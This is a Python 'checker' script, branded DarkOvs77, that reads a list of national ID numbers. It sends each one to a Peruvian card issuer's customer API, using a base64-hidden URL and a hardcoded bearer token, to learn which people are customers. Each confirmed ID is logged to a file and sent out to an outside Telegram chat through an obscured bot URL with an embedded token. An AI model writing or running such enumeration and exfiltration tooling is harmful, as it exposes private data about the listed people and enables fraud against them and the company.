import base64, requests, os, urllib3, time
from colored import fg, bg, attr
import concurrent.futures
from pwn import *

urllib3.disable_warnings()
Bot = requests.session()
list_doc = []

checked = 0
account_valid = 0
account_invalid = 0

def update_console():
    os.system(f'title "Checker Ligo - Verify | verificadas/total {checked}/{len(list_doc)} | Validas : {account_valid} | Invalidas : {account_invalid}"')
os.system('cls')
update_console()
def check_ligo(doc):
    time.sleep(1.3)
    global checked, account_valid, account_invalid
    try:
        response_verifica = Bot.post(base64.b64decode('aHR0cHM6Ly9wZXJzb25hc2xpZ29hcGkudGFyamV0YWxhbWFnaWNhLmNvbS5wZS90cHAvYXBpL3YyL2NoZWNr').decode('utf-8'), headers={'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImp0aSI6IjllZTMzN2YyYmY5ZjdlMTQwYzBiMGY0YzE1YzY5YTFkNjYzOTNiZWNlMTEyNzZmNmEwZjkzMjcyMGU1ZWI5ZWRjZmE0NTlmNGVjMTljOWY3In0.eyJhdWQiOiI4IiwianRpIjoiOWVlMzM3ZjJiZjlmN2UxNDBjMGIwZjRjMTVjNjlhMWQ2NjM5M2JlY2UxMTI3NmY2YTBmOTMyNzIwZTVlYjllZGNmYTQ1OWY0ZWMxOWM5ZjciLCJpYXQiOjE2MDMzNDAyMzEsIm5iZiI6MTYwMzM0MDIzMSwiZXhwIjoxNjM0ODc2MjMxLCJzdWIiOiIiLCJzY29wZXMiOltdfQ.TA3wV_9lmrRSgJSZ-QxiDrNqRfeGQZGFZuEaxSjwa2Zif60EcnwvM_rYUlE9S8f7T1US_5QjmJO4kksfVQeBOdP-xiaGYwdM92vLy22U7H4l1hVVcT286DzYaD1pchYVvRjZfc6gb7brjTTiPB5uNIHi7cAVB1YxWNrEN7-hgjogRJBcZCuIAy4MlTL9jsSUBvpFY9fdedApqgTMKM8QzMm0hB_tbTCGNju9OraAYxVLKhJgiUF679ozNSXa1CeMv8TUxAfYlEv10ZSWYPnAwutcGJvFd-c8Wu7eHfetWCv1CZ76w3ykyuNv0WUdSOJNKeoqA3hfNynxARdM-lmJwXrLyfd2d5jAZuZ7wLD2jjpg2z54W_qYlFpb21PqhhB7MLqJXCLR8bPNzr_n1DrweLSVUgGfIXkCpOrcEuAHEBMxv3Yn2j9zUDcg3Cqh6jy9ZhmRbizzw58HraYAo3VM7LwQwc3DlI7TaA3aGi3S8gabw1SLZAtHk-FQQdIUo2Q7nQ3xI85XM6mN2sohgdu__GN3KdAk74Tl_iZK87iBP_GV9lZv9iwxqjH1X5DC-qpTo_qA1z57tn_MzI2BAnjFKpktLn0Clf4bhV-AvPIXsEjn-XxxLuf74DUHzJOGa1ceMkCsQ04tx1xxrPhEG4VVN6IcDu7x5TPWOGKrxANvtto','Content-Type': 'application/json'}, json={"doc_type": 1,"doc_number": str(doc)}, verify=False)
        checked += 1
        if response_verifica.status_code == 200:
            if 'El cliente existe' in response_verifica.text:
                F = open('documentos_verificados.txt','a+')
                Bot.post(base64.b64decode('aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDE2MzE2MTE5MzA6QUFIcFNTNVpkTGhmR0pTa2NrZ29RLWd5dFJsNjFwVldOY2Mvc2VuZE1lc3NhZ2U=').decode('utf-8'), data={'chat_id': '-557762958','text':str(doc)+'\n'})
                F.write(str(doc)+'\n')
                log.success(fg('green')+f'El usuario : {fg("yellow")+str(doc)+fg("green")} existe en la BD.'+attr('reset'))
                account_valid += 1
                F.close()
                update_console()
            elif 'El cliente no existe' in response_verifica.text:
                account_invalid += 1
                log.failure(fg('red')+f'El usuario : {fg("yellow")+str(doc)+fg("red")} no existe en la BD.'+attr('reset'))
                update_console()
            else:
                log.warning(fg('purple_1a')+f'El usuario : {fg("yellow")+str(doc)+fg("purple_1a")} se encuentra bloqueado.')
        else:
            log.warning(f'Error en la petición : {str(response_verifica.status_code)}')
        
    except Exception as e:
        print(e)
        log.failure('Ocurrio un error.')
        os.system('exit')

if __name__ == '__main__':
    print(fg('purple_1a')+"""
  _____             _     ____            
 |  __ \           | |   / __ \           
 | |  | | __ _ _ __| | _| |  | __   _____ 
 | |  | |/ _` | '__| |/ | |  | \ \ / / __|
 | |__| | (_| | |  |   <| |__| |\ V /\__ \ 
 |_____/ \__,_|_|  |_|\_\\____/  \_/ |___/
 \n\t\t\t\tPowered By : DarkOvs77\n"""+attr('reset'))
    ruta = input(fg("yellow")+'Ingresa la ruta de los documentos => '+attr('reset'))
    with open(ruta) as doc:
        lines = [lines.rstrip() for lines in doc]
        for document in lines:
            list_doc.append(document)
    with concurrent.futures.ThreadPoolExecutor() as ligoDead:
        ligoDead.map(check_ligo, list_doc)
    log.success(f'************************\nCombo : {len(list_doc)}\nCuentas Validas : {account_valid}\nCuentas Invalidas : {account_invalid}\n************************')